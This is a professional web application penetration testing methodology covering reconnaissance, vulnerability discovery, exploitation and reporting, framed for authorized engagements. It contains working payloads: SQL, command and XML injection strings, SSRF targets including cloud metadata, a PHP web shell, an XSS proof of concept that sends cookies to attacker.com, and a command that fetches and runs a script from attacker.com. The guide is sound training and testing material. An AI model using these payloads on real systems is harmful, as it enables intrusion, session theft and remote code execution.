# Web Application Penetration Testing Methodology
## Professional Step-by-Step Guide

**Author:** Security Research Team  
**Version:** 2.0  
**Last Updated:** 2025  
**Classification:** ACTIONABLE METHODOLOGY

---

## CRITICAL REMINDERS

⚠️ **AUTHORIZATION REQUIRED**
- Get written permission BEFORE testing
- Define scope clearly (domains, IPs, endpoints)
- Agree on testing windows
- Establish communication channels
- Document everything

⚠️ **STAY IN SCOPE**
- Test ONLY authorized targets
- Don't pivot to out-of-scope systems
- Don't test production during business hours (unless authorized)
- Stop immediately if you encounter sensitive data

---

## METHODOLOGY OVERVIEW

```
Phase 1: Information Gathering (Reconnaissance)
Phase 2: Application Mapping & Analysis
Phase 3: Vulnerability Discovery
Phase 4: Exploitation & Validation
Phase 5: Post-Exploitation (if authorized)
Phase 6: Documentation & Reporting
```

**Time Allocation:** (for a typical 40-hour engagement)
- Phase 1: 4-6 hours (10-15%)
- Phase 2: 6-8 hours (15-20%)
- Phase 3: 12-16 hours (30-40%)
- Phase 4: 8-12 hours (20-30%)
- Phase 5: 2-4 hours (5-10%)
- Phase 6: 4-6 hours (10-15%)

---

## PHASE 1: INFORMATION GATHERING (RECONNAISSANCE)

**Goal:** Understand the target, technology stack, attack surface

### 1.1 Passive Reconnaissance (No Direct Contact)

#### A. Domain & Subdomain Discovery
```bash
# Subdomain enumeration
subfinder -d target.com -all -recursive -o subdomains.txt
amass enum -passive -d target.com -o amass_subs.txt
assetfinder --subs-only target.com > assetfinder_subs.txt

# Combine and deduplicate
cat subdomains.txt amass_subs.txt assetfinder_subs.txt | sort -u > all_subdomains.txt

# Validate live hosts
httpx -l all_subdomains.txt -o live_hosts.txt -title -tech-detect -status-code
```

**Tools:**
- subfinder, amass, assetfinder, chaos
- crt.sh, censys, shodan

#### B. Technology Fingerprinting
```bash
# Detect technologies
whatweb -v -a 3 https://target.com
wappalyzer https://target.com

# Check HTTP headers
curl -I https://target.com

# Identify CMS/Framework
# WordPress: /wp-admin, /wp-content
# Drupal: /user/login, CHANGELOG.txt
# Next.js: /_next/static
# React: view-source for React patterns
```

**Look for:**
- Web server (Apache, Nginx, IIS)
- Programming language (PHP, Python, Node.js, Java)
- Framework (Laravel, Django, Express, Spring)
- CMS (WordPress, Drupal, Joomla)
- JavaScript frameworks (React, Angular, Vue, Next.js)
- WAF (Cloudflare, Akamai, AWS WAF)
- CDN
- Cloud provider (AWS, Azure, GCP)

#### C. OSINT (Open Source Intelligence)
```bash
# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:config
site:target.com ext:sql
site:target.com ext:env
site:target.com "Index of /"

# GitHub/GitLab reconnaissance
# Search for: target.com, API keys, credentials, config files
# Tools: truffleHog, GitDorker, GittyLeaks

# Shodan/Censys
shodan search hostname:target.com
shodan search ssl:target.com

# Wayback Machine
waybackurls target.com > wayback_urls.txt
gau target.com > gau_urls.txt
```

**Look for:**
- Exposed credentials in GitHub
- API keys, tokens
- Old/forgotten subdomains
- Development/staging environments
- Admin panels
- Documentation
- Employee emails (for social engineering scope)

#### D. DNS Reconnaissance
```bash
# DNS enumeration
dig target.com ANY
nslookup target.com
host -a target.com

# DNS zone transfer (rare but worth checking)
dig axfr @ns1.target.com target.com

# Reverse DNS
dig -x <IP_ADDRESS>
```

### 1.2 Active Reconnaissance (Direct Contact)

#### A. Port Scanning
```bash
# Quick scan (top ports)
nmap -sV -sC -T4 --top-ports 1000 target.com -oN nmap_quick.txt

# Full scan (all ports) - if time permits
nmap -p- -sV -sC -T4 target.com -oN nmap_full.txt

# Web-specific ports
nmap -p 80,443,8080,8443,3000,5000,8000,8888 -sV target.com
```

**Common Web Ports:**
- 80 (HTTP)
- 443 (HTTPS)
- 8080, 8443 (Alternate HTTP/HTTPS)
- 3000 (Node.js development)
- 5000 (Flask development)
- 8000 (Django development)
- 8888 (Jupyter, alternate HTTP)

#### B. Web Application Fingerprinting
```bash
# Nikto scan (basic)
nikto -h https://target.com -o nikto_results.txt

# Nuclei scan (comprehensive)
nuclei -u https://target.com -tags tech,panel,exposure -o nuclei_results.txt
```

---

## PHASE 2: APPLICATION MAPPING & ANALYSIS

**Goal:** Map the entire application structure, understand functionality

### 2.1 Manual Exploration (CRITICAL - Don't Skip)

#### A. Browse the Application
1. **Sign up for an account** (if possible)
2. **Map all functionality:**
   - Authentication (login, register, password reset)
   - Authorization (user roles, permissions)
   - Profile management
   - Search functionality
   - File upload
   - Payment processing
   - API endpoints
   - Admin panels
   - Help/documentation sections

3. **Document every feature:**
   - What does it do?
   - What inputs does it accept?
   - What HTTP methods? (GET, POST, PUT, DELETE)
   - What parameters?
   - What responses?

4. **Look for hidden functionality:**
   - Check robots.txt
   - Check sitemap.xml
   - View page source for commented code
   - Check JavaScript files for endpoints
   - Look at browser dev tools (Network tab)

#### B. Intercept Traffic with Burp Suite
```
Setup:
1. Configure Burp as proxy (127.0.0.1:8080)
2. Install Burp CA certificate in browser
3. Enable "Intercept" in Proxy tab
4. Browse the entire application
5. Check HTTP History for all requests
```

**Key Things to Check:**
- Hidden parameters
- API endpoints
- Session tokens
- Cookie attributes
- Headers (especially custom headers)
- Request/response patterns

### 2.2 Automated Crawling & Spidering

#### A. Content Discovery
```bash
# Directory/file brute-forcing
ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt -mc 200,301,302,401,403 -o ffuf_results.txt

# Common wordlists:
# - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# - /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
# - /usr/share/seclists/Discovery/Web-Content/common.txt

# Feroxbuster (recursive)
feroxbuster -u https://target.com -w /path/to/wordlist.txt -x php,html,js,txt,json -o ferox_results.txt

# Gobuster
gobuster dir -u https://target.com -w /path/to/wordlist.txt -x php,html,js -o gobuster_results.txt
```

**Common Interesting Paths:**
- /admin, /administrator
- /api, /api/v1, /api/v2
- /config, /configuration
- /backup, /backups
- /old, /test, /dev
- /console, /dashboard
- /swagger, /api-docs
- /.git, /.env, /config.php
- /phpinfo.php, /info.php
- /wp-admin (WordPress)
- /debug, /trace

#### B. Parameter Discovery
```bash
# Find hidden parameters
arjun -u https://target.com/endpoint -o arjun_params.txt

# Or use Burp Suite extensions:
# - Param Miner
# - GAP (Burp)
```

#### C. JavaScript Analysis
```bash
# Extract endpoints from JS files
python3 linkfinder.py -i https://target.com/app.js -o cli

# Download all JS files and analyze
wget -r -l1 -H -t1 -nd -N -np -A.js https://target.com/
grep -r "api\|endpoint\|/v1\|/v2\|token\|key\|password" *.js

# Use tools:
# - JSFinder
# - SecretFinder
# - relative-url-extractor
```

### 2.3 API Discovery & Documentation

#### A. Find API Endpoints
```bash
# Look for API documentation
curl https://target.com/api
curl https://target.com/api-docs
curl https://target.com/swagger
curl https://target.com/docs
curl https://target.com/graphql
curl https://target.com/v1
curl https://target.com/api/v1/health

# GraphQL introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'
```

#### B. API Testing Setup
- Document all API endpoints
- Understand authentication mechanism (JWT, API keys, OAuth)
- Test with different HTTP methods
- Check versioning (v1, v2, v3)

---

## PHASE 3: VULNERABILITY DISCOVERY

**Goal:** Identify security vulnerabilities systematically

### 3.1 Authentication & Session Management

#### A. Authentication Bypass
```
Test Cases:
1. SQL injection in login form
   Username: admin' OR '1'='1' --
   Password: anything

2. NoSQL injection (MongoDB)
   Username: {"$gt": ""}
   Password: {"$gt": ""}

3. LDAP injection
   Username: *)(&
   Password: anything

4. Default credentials
   admin:admin, admin:password, root:root, test:test

5. Password reset flaws
   - Token not invalidated after use
   - Predictable tokens
   - Token sent in URL
   - Host header injection
   - Race conditions

6. JWT vulnerabilities
   - None algorithm (alg: none)
   - Weak secret (bruteforce with jwt_tool)
   - Key confusion (RS256 to HS256)
   - Signature not verified
```

**Tools:**
```bash
# JWT testing
jwt_tool <JWT_TOKEN> -t https://target.com/api/endpoint -rh "Authorization: Bearer JWT_HERE"

# Bruteforce
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

#### B. Session Management
```
Check:
1. Session fixation
2. Session not invalidated on logout
3. Concurrent sessions allowed
4. Session token in URL
5. No session timeout
6. Weak session IDs (predictable)
7. Missing Secure flag on cookies (over HTTPS)
8. Missing HttpOnly flag on cookies
9. No SameSite attribute
10. Session token exposed in logs/Referer
```

**Test with Burp:**
- Capture session token
- Try reusing after logout
- Try using in different browser
- Check token randomness (Sequencer)

### 3.2 Authorization & Access Control

#### A. Horizontal Privilege Escalation (IDOR)
```
Test Cases:
1. Manipulate user ID parameters
   GET /api/user/123/profile  →  GET /api/user/124/profile
   
2. Manipulate object IDs
   GET /api/orders/1001  →  GET /api/orders/1002
   
3. Try different HTTP methods
   If GET blocked, try POST/PUT/DELETE
   
4. Parameter pollution
   /api/user?id=123&id=124
   
5. Array manipulation
   /api/users?id[]=123&id[]=124
   
6. UUID/GUID prediction
   If using UUIDs, check if predictable
```

**Automated Testing:**
```bash
# Autorize (Burp extension) - automatically test authorization
# Or use custom script:
for i in {1..1000}; do
  curl -H "Cookie: session=YOUR_SESSION" https://target.com/api/user/$i/profile
done
```

#### B. Vertical Privilege Escalation
```
Test Cases:
1. Access admin endpoints as regular user
   /admin, /api/admin, /administrator
   
2. Role parameter manipulation
   POST /api/user/update
   {"role": "admin", "email": "attacker@evil.com"}
   
3. Mass assignment
   POST /api/register
   {"username": "test", "password": "test", "is_admin": true}
   
4. GraphQL field manipulation
   query { user { id, email, role, is_admin } }
   
5. Cookie/JWT role manipulation
   Change role: user → admin in JWT payload
```

### 3.3 Injection Vulnerabilities

#### A. SQL Injection (SQLi)
```
Manual Testing:
1. Basic tests
   ' OR '1'='1' --
   ' OR '1'='1' /*
   ') OR ('1'='1
   
2. Union-based
   ' UNION SELECT NULL, NULL, NULL --
   ' UNION SELECT username, password FROM users --
   
3. Time-based blind
   ' AND SLEEP(5) --
   ' AND IF(1=1, SLEEP(5), 0) --
   
4. Boolean-based blind
   ' AND 1=1 --  (True)
   ' AND 1=2 --  (False)
   
5. Error-based
   ' AND 1=CONVERT(int, (SELECT @@version)) --
```

**Automated:**
```bash
# sqlmap (powerful but noisy)
sqlmap -u "https://target.com/page?id=1" --batch --dbs

# With authenticated session
sqlmap -u "https://target.com/api/user?id=1" \
  --cookie="session=YOUR_SESSION_TOKEN" \
  --batch --dbs --level=5 --risk=3

# POST request
sqlmap -r request.txt --batch --dbs
```

**Test ALL Input Points:**
- GET parameters
- POST parameters
- HTTP headers (User-Agent, Referer, X-Forwarded-For)
- Cookies
- JSON fields
- XML fields
- File names

#### B. Cross-Site Scripting (XSS)
```
Types:
1. Reflected XSS (in URL, reflected back)
2. Stored XSS (saved in database)
3. DOM-based XSS (JavaScript manipulation)

Basic Payloads:
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>
4. javascript:alert(1)
5. <iframe src=javascript:alert(1)>

Bypass Filters:
1. Uppercase: <ScRiPt>alert(1)</sCrIpT>
2. URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
3. Double encoding: %253Cscript%253E
4. Unicode: \u003cscript\u003e
5. HTML entities: &lt;script&gt;alert(1)&lt;/script&gt;
6. Event handlers: <body onload=alert(1)>
7. Mixed case tags: <ScRiPt>alert(1)</sCrIpT>
```

**Automated:**
```bash
# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Dalfox
dalfox url https://target.com/search?q=test

# nuclei XSS templates
nuclei -u https://target.com -tags xss
```

**Test Locations:**
- Search boxes
- Comment fields
- Profile fields (name, bio, etc.)
- URL parameters
- HTTP headers
- File upload (filename, content)

#### C. Command Injection
```
Payloads:
1. Basic
   ; ls
   | ls
   & ls
   && ls
   || ls
   
2. Chained
   ; whoami; ls -la
   | cat /etc/passwd
   
3. Backticks
   `whoami`
   $(whoami)
   
4. With input
   file.txt; cat /etc/passwd #
   
5. Blind (time-based)
   ; sleep 10
   | ping -c 10 127.0.0.1

Test Windows:
   & dir
   | dir
   && dir
```

**Common Vulnerable Parameters:**
- File operations (filename, path)
- Network operations (ping, traceroute, nslookup)
- System commands (convert, resize)
- Email functions (recipient, subject)

#### D. XML External Entity (XXE)
```xml
Basic XXE:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>

SSRF via XXE:
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>

Out-of-band (OOB):
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
```

**Test in:**
- XML parsers
- SOAP services
- File upload (SVG, DOCX, XLSX)
- RSS feeds
- SAML requests

#### E. Server-Side Request Forgery (SSRF)
```
Payloads:
1. Internal network
   http://127.0.0.1
   http://localhost
   http://0.0.0.0
   http://[::1]
   http://192.168.1.1
   http://10.0.0.1
   http://172.16.0.1

2. Cloud metadata
   http://169.254.169.254/latest/meta-data/
   http://metadata.google.internal/computeMetadata/v1/
   http://169.254.169.254/metadata/instance?api-version=2021-02-01

3. Bypass filters
   http://127.1
   http://0x7f.0x0.0x0.0x1
   http://017700000001
   http://127.0.0.1.nip.io
   http://[::ffff:127.0.0.1]

4. Protocol smuggling
   gopher://127.0.0.1:6379/_SET%20key%20value
   dict://127.0.0.1:11211/stats
   file:///etc/passwd
```

**Test Parameters:**
- URL parameters
- Image/avatar URLs
- Webhook URLs
- PDF generation
- XML parsing
- File import

#### F. Local/Remote File Inclusion (LFI/RFI)
```
LFI Payloads:
1. Basic
   ../../../../etc/passwd
   ..%2F..%2F..%2F..%2Fetc%2Fpasswd
   
2. Null byte bypass (old PHP)
   ../../../../etc/passwd%00
   
3. Wrappers (PHP)
   php://filter/convert.base64-encode/resource=index.php
   data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
   expect://whoami
   
4. Log poisoning
   ../../../../var/log/apache2/access.log
   (After injecting PHP code in User-Agent)

RFI Payloads:
   http://attacker.com/shell.php
   \\attacker.com\share\shell.php
```

**Common Vulnerable Parameters:**
- ?page=
- ?file=
- ?include=
- ?template=
- ?path=

### 3.4 Business Logic Vulnerabilities

```
Test Cases:
1. Price manipulation
   - Change price to 0 or negative
   - Change quantity to negative (refund attack)
   - Manipulate discount codes
   
2. Race conditions
   - Multiple concurrent requests
   - Gift card redemption
   - Account balance updates
   - Limited quantity items
   
3. Workflow bypass
   - Skip payment step
   - Skip verification step
   - Access later steps directly
   
4. Parameter tampering
   - Change user ID in order
   - Change shipping cost
   - Change product quantity limits
   
5. Rate limiting bypass
   - Missing rate limits
   - Weak rate limits
   - Bypass via different IPs/headers
```

**Tools:**
```bash
# Race condition testing (Turbo Intruder - Burp extension)
# Or Python script:
import concurrent.futures
import requests

def send_request():
    return requests.post('https://target.com/redeem', data={'code': 'GIFT100'})

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(send_request) for _ in range(20)]
    results = [future.result() for future in futures]
```

### 3.5 File Upload Vulnerabilities

```
Test Cases:
1. Unrestricted file upload
   - Upload PHP shell: <?php system($_GET['cmd']); ?>
   - Upload JSP shell
   - Upload ASP/ASPX shell
   
2. Extension bypass
   - Double extension: shell.php.jpg
   - Null byte: shell.php%00.jpg
   - Case manipulation: shell.PhP
   - Add valid extension: shell.jpg.php
   
3. Content-Type bypass
   - Change to image/jpeg while uploading PHP
   
4. Magic byte bypass
   - Add GIF89a at start of PHP file
   
5. Path traversal in filename
   - ../../shell.php
   - ..%2F..%2Fshell.php
   
6. Polyglot files
   - GIF with embedded PHP code
   
7. XXE via SVG/XML upload
   
8. XSS via SVG upload
   <svg onload=alert(1)>
```

**Test:**
```bash
# Create test files
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
echo "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php.gif

# Upload and try to access
curl https://target.com/uploads/shell.php?cmd=whoami
```

### 3.6 Security Misconfigurations

```
Check:
1. Default credentials
   - admin:admin, root:root
   - Check documentation for defaults
   
2. Directory listing
   - Check if /uploads/, /files/, /backup/ are browsable
   
3. Exposed sensitive files
   - /.env, /config.php, /web.config
   - /.git/ (download with git-dumper)
   - /backup.zip, /db.sql
   - /.aws/credentials
   
4. Debug mode enabled
   - Stack traces exposed
   - Verbose error messages
   
5. Missing security headers
   - X-Frame-Options (Clickjacking)
   - X-Content-Type-Options
   - Strict-Transport-Security
   - Content-Security-Policy
   
6. CORS misconfiguration
   - Reflected Origin header
   - Wildcard with credentials
```

**Tools:**
```bash
# Security headers check
curl -I https://target.com

# CORS check
curl -H "Origin: https://evil.com" -I https://target.com/api/endpoint

# Git exposure
git-dumper https://target.com/.git/ ./git_dump
```

### 3.7 API-Specific Vulnerabilities

```
Test Cases:
1. Excessive data exposure
   - Check API responses for sensitive data
   - PII, tokens, internal IDs
   
2. Mass assignment
   - Add unexpected parameters
   - {"is_admin": true, "role": "admin"}
   
3. GraphQL specific
   - Introspection enabled
   - Field suggestions
   - Batching attacks
   - Circular queries (DoS)
   
4. API versioning issues
   - Test /v1, /v2, /v3
   - Older versions may have vulnerabilities
   
5. Rate limiting
   - Brute force attacks
   - Resource exhaustion
   
6. JWT attacks
   - None algorithm
   - Weak secrets
   - Key confusion
```

**GraphQL Testing:**
```bash
# Introspection query
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Batching attack
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"query { user(id:1) { email } }"},
    {"query":"query { user(id:2) { email } }"},
    ...repeat 1000 times...
  ]'
```

---

## PHASE 4: EXPLOITATION & VALIDATION

**Goal:** Prove vulnerabilities are exploitable, demonstrate impact

### 4.1 Proof of Concept (PoC)

**For Each Vulnerability:**

1. **Document the steps**
   - Exact reproduction steps
   - Screenshots/video
   - HTTP requests/responses
   
2. **Create working PoC**
   - Python script
   - cURL command
   - Burp request file
   
3. **Demonstrate impact**
   - What data can be accessed?
   - What actions can be performed?
   - What's the business impact?

### 4.2 Exploitation Guidelines

**Safe Exploitation:**
```
DO:
✓ Use your own test accounts
✓ Test on development/staging when possible
✓ Limit data extraction (don't download entire database)
✓ Use unique identifiers in payloads (for tracking)
✓ Stop when impact is proven
✓ Document everything

DON'T:
✗ Modify production data
✗ Delete data
✗ Access other users' sensitive data beyond PoC
✗ Perform DoS attacks
✗ Test during business hours (without approval)
✗ Pivot to internal networks (without authorization)
```

### 4.3 Example PoCs

#### SQL Injection PoC
```python
import requests

url = "https://target.com/api/user"
params = {
    "id": "1' UNION SELECT username, password FROM users WHERE id=1 --"
}

response = requests.get(url, params=params)
print(response.text)
```

#### IDOR PoC
```bash
# Your account (victim)
curl -H "Cookie: session=VICTIM_SESSION" \
  https://target.com/api/user/123/profile

# Attacker account accessing victim
curl -H "Cookie: session=ATTACKER_SESSION" \
  https://target.com/api/user/123/profile
```

#### XSS PoC
```html
<!-- Payload -->
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Or report with screenshot -->
1. Navigate to https://target.com/profile/edit
2. Enter payload in "Bio" field: <script>alert(document.domain)</script>
3. Save profile
4. Navigate to https://target.com/profile/view
5. JavaScript executes in victim's browser
```

---

## PHASE 5: POST-EXPLOITATION (If Authorized)

**Goal:** Understand full impact, assess lateral movement potential

### 5.1 Privilege Escalation (If Shell Access)

```bash
# Linux enumeration
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/crontab
netstat -tulpn

# Upload linpeas/linenum
wget http://attacker.com/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 5.2 Pivoting (Only if authorized)

```bash
# Network discovery
ip addr
arp -a
netstat -ano

# Port forwarding (SSH)
ssh -L 8080:internal-server:80 user@target.com

# SOCKS proxy
ssh -D 9050 user@target.com
# Then use proxychains
```

### 5.3 Data Exfiltration (Minimal for PoC)

```
Guidelines:
- Extract ONLY enough data to prove impact
- Use synthetic/test data when possible
- Don't download entire databases
- Document what COULD be accessed
- Delete any extracted data after reporting
```

---

## PHASE 6: DOCUMENTATION & REPORTING

**Goal:** Clear, actionable report for remediation

### 6.1 Vulnerability Documentation Template

```markdown
## Vulnerability Title
**Severity:** Critical/High/Medium/Low
**CVSS Score:** X.X
**CWE:** CWE-XXX

### Description
[Clear explanation of the vulnerability]

### Location
- URL: https://target.com/vulnerable/endpoint
- Parameter: vulnerable_param
- Method: POST

### Impact
[Business impact - what can an attacker do?]
- Access sensitive data
- Modify user accounts
- Execute arbitrary code
- etc.

### Reproduction Steps
1. Step 1
2. Step 2
3. Step 3

### Proof of Concept
```bash
curl -X POST https://target.com/api \
  -d '{"payload": "malicious"}'
```

### Evidence
[Screenshots, HTTP requests/responses]

### Remediation
[Specific fixes]
- Input validation
- Update framework
- Implement authentication
- etc.

### References
- OWASP link
- CVE reference
- Documentation
```

### 6.2 Report Structure

```
1. Executive Summary
   - Number of vulnerabilities
   - Severity breakdown
   - Key findings
   - Risk level

2. Scope
   - What was tested
   - What was not tested
   - Testing methodology

3. Findings
   - Critical vulnerabilities (detailed)
   - High vulnerabilities (detailed)
   - Medium vulnerabilities (summarized)
   - Low vulnerabilities (summarized)

4. Recommendations
   - Immediate actions
   - Long-term improvements
   - Security best practices

5. Appendices
   - Full vulnerability list
   - Tools used
   - Testing timeline
```

### 6.3 Severity Rating (CVSS v3)

```
CRITICAL (9.0-10.0)
- Unauthenticated RCE
- SQL injection with admin access
- Complete authentication bypass

HIGH (7.0-8.9)
- Authenticated RCE
- Privilege escalation to admin
- Sensitive data exposure

MEDIUM (4.0-6.9)
- IDOR
- Stored XSS
- CSRF on sensitive functions

LOW (0.1-3.9)
- Reflected XSS (limited impact)
- Information disclosure (minimal)
- Missing security headers
```

---

## TOOLS CHECKLIST

### Essential Tools
```bash
# Reconnaissance
□ subfinder, amass, assetfinder
□ httpx, httpprobe
□ whatweb, wappalyzer
□ nmap

# Proxy & Interception
□ Burp Suite Professional (or Community)
□ OWASP ZAP

# Content Discovery
□ ffuf, feroxbuster, gobuster
□ dirsearch

# Vulnerability Scanning
□ nuclei
□ nikto

# Exploitation
□ sqlmap
□ XSStrike, dalfox
□ jwt_tool
□ commix (command injection)

# API Testing
□ Postman
□ Insomnia
□ GraphQL Playground

# Misc
□ curl, wget
□ jq (JSON parsing)
□ python3 with requests
```

### Wordlists
```
□ SecLists (github.com/danielmiessler/SecLists)
□ Assetnote wordlists
□ Custom wordlists based on target technology
```

---

## COMMON PITFALLS TO AVOID

```
✗ Testing without proper authorization
✗ Skipping manual testing (relying only on scanners)
✗ Not testing as different user roles
✗ Missing API endpoints
✗ Ignoring client-side code (JavaScript)
✗ Not testing mobile applications
✗ Forgetting to test HTTP methods (GET/POST/PUT/DELETE/PATCH)
✗ Not checking older API versions
✗ Overlooking business logic flaws
✗ Poor documentation
✗ Not retesting after fixes
```

---

## TIME MANAGEMENT TIPS

```
1. Start with quick wins (automated scans)
2. Focus on high-impact areas first (authentication, authorization)
3. Don't get stuck on one vulnerability
4. Set time limits per phase
5. Document as you go (don't wait until end)
6. Prioritize based on scope and risk
7. Automated scan while you manual test
8. Take breaks to maintain focus
```

---

## QUICK WIN CHECKLIST

**First 2 Hours - Find These:**
```
□ Default credentials
□ Exposed .git directory
□ Exposed .env file
□ Directory listing enabled
□ Subdomain takeover
□ IDOR in API endpoints
□ Missing authentication on API
□ SQL injection in search
□ Reflected XSS in search
□ SSRF in profile picture/URL fields
```

---

## FINAL CHECKLIST BEFORE REPORTING

```
□ All findings reproduced and confirmed
□ PoC created for each vulnerability
□ Screenshots/evidence collected
□ Severity assigned correctly
□ Remediation advice provided
□ Report reviewed for accuracy
□ No sensitive data in report (redact if necessary)
□ Professional language used
□ Client notified of critical issues immediately
```

---

## EXAMPLE WORKFLOW (40-HOUR ENGAGEMENT)

### Day 1 (8 hours)
- 0-2h: Reconnaissance (passive)
- 2-4h: Active recon, subdomain validation
- 4-6h: Manual application exploration
- 6-8h: Setup Burp, proxy traffic, document application

### Day 2 (8 hours)
- 0-2h: Automated content discovery
- 2-4h: Test authentication mechanisms
- 4-6h: Test authorization (IDOR, privilege escalation)
- 6-8h: SQL injection testing

### Day 3 (8 hours)
- 0-2h: XSS testing
- 2-4h: SSRF, XXE, command injection
- 4-6h: Business logic testing
- 6-8h: API-specific testing

### Day 4 (8 hours)
- 0-2h: File upload testing
- 2-4h: Session management testing
- 4-6h: Exploit development for found issues
- 6-8h: Retest, validate all findings

### Day 5 (8 hours)
- 0-4h: Additional testing on interesting findings
- 4-8h: Documentation, report writing

---

## PROFESSIONAL COMMUNICATION

### During Testing
```
✓ Notify client of critical issues immediately
✓ Ask questions when scope is unclear
✓ Provide daily status updates (if requested)
✓ Be responsive to client questions
```

### Reporting Critical Issues
```
Subject: [URGENT] Critical Vulnerability Found - [Client Name]

Hi [Client],

During our penetration test, I've discovered a critical vulnerability that requires immediate attention:

Issue: SQL Injection in login form
Impact: Full database access, including user credentials
Affected: https://target.com/login

I'm documenting this now and will send detailed findings with remediation steps within the next hour. Please let me know if you need immediate assistance.

Temporary mitigation: [If applicable]

Best regards,
[Your Name]
```

---

## RESOURCES FOR CONTINUOUS LEARNING

```
Documentation:
- OWASP Testing Guide
- OWASP Top 10
- PortSwigger Web Security Academy
- HackerOne Disclosed Reports

Practice Platforms:
- PortSwigger Web Security Academy (FREE labs)
- HackTheBox
- TryHackMe
- PentesterLab
- Damn Vulnerable Web Application (DVWA)

Bug Bounty:
- HackerOne
- Bugcrowd
- Intigriti
- YesWeHack
```

---

## LEGAL DISCLAIMER

```
This methodology is for AUTHORIZED testing ONLY.

Before starting ANY test:
1. Get written authorization
2. Define clear scope
3. Establish rules of engagement
4. Agree on communication channels
5. Define success criteria
6. Set testing windows

UNAUTHORIZED testing is ILLEGAL and can result in:
- Criminal charges
- Civil lawsuits
- Job loss
- Reputation damage
- Financial penalties

ALWAYS test responsibly and ethically.
```

---

## SUMMARY - YOUR STEP-BY-STEP CHECKLIST

```
Phase 1: Information Gathering
  □ Subdomain enumeration
  □ Technology fingerprinting
  □ Google dorking
  □ GitHub reconnaissance
  □ Port scanning
  
Phase 2: Application Mapping
  □ Manual exploration (create account, browse)
  □ Burp Suite traffic analysis
  □ Content discovery (ffuf/feroxbuster)
  □ JavaScript analysis
  □ API endpoint discovery
  
Phase 3: Vulnerability Discovery
  □ Authentication testing (SQLi, bypass, default creds)
  □ Session management
  □ Authorization (IDOR, privilege escalation)
  □ SQL injection (all parameters)
  □ XSS (reflected, stored, DOM)
  □ Command injection
  □ XXE
  □ SSRF
  □ LFI/RFI
  □ Business logic flaws
  □ File upload vulnerabilities
  □ Security misconfigurations
  □ API vulnerabilities
  
Phase 4: Exploitation
  □ Create PoC for each finding
  □ Document steps clearly
  □ Capture evidence
  □ Demonstrate impact
  
Phase 5: Post-Exploitation (if authorized)
  □ Privilege escalation
  □ Lateral movement assessment
  □ Minimal data exfiltration for PoC
  
Phase 6: Documentation
  □ Detailed vulnerability reports
  □ Executive summary
  □ Remediation recommendations
  □ Professional presentation
```

---

**This is a battle-tested methodology used by professional pentesters. Follow it systematically, document everything, and you'll find the bugs.**

**Good hunting! 🎯**


